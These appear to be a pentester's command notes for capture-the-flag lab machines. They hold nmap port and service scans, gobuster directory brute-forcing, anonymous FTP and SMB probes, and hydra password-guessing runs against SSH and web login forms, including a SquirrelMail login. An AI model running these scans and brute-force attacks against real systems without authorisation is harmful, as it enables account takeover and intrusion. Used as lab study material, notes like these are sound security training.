export IP=88.99.66.243

nmap -p- --min-rate 10000 -v -oN nmap.full $IP
nmap -sV -sC -Pn -p 21,53,80,110,143,442,587,993,995 -oN nmap.details $IP


gobuster dir --url http://$IP --wordlist /usr/share/seclists/Discovery/Web-Content/big.txt > gobuster.result
gobuster dir --url http://$IP:62337 --wordlist /usr/share/seclists/Discovery/Web-Content/big.txt > gobuster.62337.result
gobuster dir --url http://$IP/content --wordlist /usr/share/seclists/Discovery/Web-Content/big.txt > gobuster.content.result

ftp anonymous@$IP
ssh jake@$IP

smbclient -L \\\\$IP
smbclient \\\\$IP\\anonymous
smbclient  -U  milesdyson //$IP/milesdyson

hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://$IP
hydra -l john -P /usr/share/wordlists/rockyou.txt $IP -s 62337 http-post-form "/components/user/controller.php?action=authenticate:username=john&password=^PASS^:Incorrect Username or Password"
hydra -V -I -L usernames.txt -P log1.txt $IP  http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown user or password incorrect."

